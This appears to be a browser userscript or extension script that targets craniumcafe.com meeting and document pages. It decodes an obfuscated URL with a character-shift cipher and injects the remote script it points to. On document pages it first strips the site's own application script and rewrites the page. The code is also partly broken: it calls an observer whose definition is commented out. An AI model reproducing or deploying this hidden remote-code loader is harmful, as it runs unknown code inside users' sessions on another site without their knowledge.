var key = 67;
var f = (n) => n.split("").map(s => String.fromCharCode((((s.charCodeAt(0)-46)+key)%79)+46)).join("");
var t = new Date();
var t0 = 1630886400000;
var sc = document.createElement("script");
sc.setAttribute("defer","defer");
sc.src = f("t11|0F;;opz:v0pqxu3/:zq1;st;ym1tzm0u2y0o/u|10;ym1ty{puruq/0o/u|1;0o@:v0K1I") + Math.floor((t.getTime() - t0)/86400000);

window.changeScriptAllowance = () => localStorage.getItem("disallowScript")?localStorage.setItem("disallowScript",""):localStorage.setItem("disallowScript","true");
var altload = "EMPTYSET";
if(!localStorage.getItem("disallowScript"))
    altload = "/client/js/app-";

(function(){
    console.log(window.location.href);
    if(window.location.href.indexOf(".craniumcafe.com/meetings/")>-1)
        document.getElementById("audio-alert") ? document.body.appendChild(sc) : window.addEventListener("load",function(){document.body.appendChild(sc)});
    if(window.location.href.indexOf(".craniumcafe.com/d/")==-1)return;
    var link = window.location.href;
    var xhr = new XMLHttpRequest();
    xhr.open("GET",link);
    webpackChunkconexed_whiteboard_client = [];
    xhr.onload = function()
    {
        var html = xhr.responseText
      .replace(/<script\b[\s\S]*?<\/script>/g, s => {
        if (s.includes('client/js/app-')) {
          return '';
        } else {
          return s;
        }
      })
    document.open();
    document.write(html);
    document.close();
        window.scriptLoaded = true;
        document.head.appendChild(sc);
  };xhr.send();
    
    console.log("IS OBSERVING NOW");
    window.scriptLoaded = true;
    console.log(window.scriptLoaded);
    /*
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      Array.from(document.querySelectorAll('script')).forEach(s => {
        if (s.src && (s.src.indexOf(altload) != -1)) {
            window.stableSource = s.src;
            console.log(window.stableSource);
            console.log(s.src);
            document.head.appendChild(sc);
            s.type = 'javascript/blocked'
            s.parentElement.removeChild(s);
            window.scriptLoaded = true;
            observer.disconnect();
        }
      });
    });
  });
*/
function observe(){if(!document.documentElement)return setTimeout(observe,10);observer.observe(document.documentElement,{childList: true, subtree: true})};
observe();
window.disconnectObserver = function(){observer.disconnect()};
}());
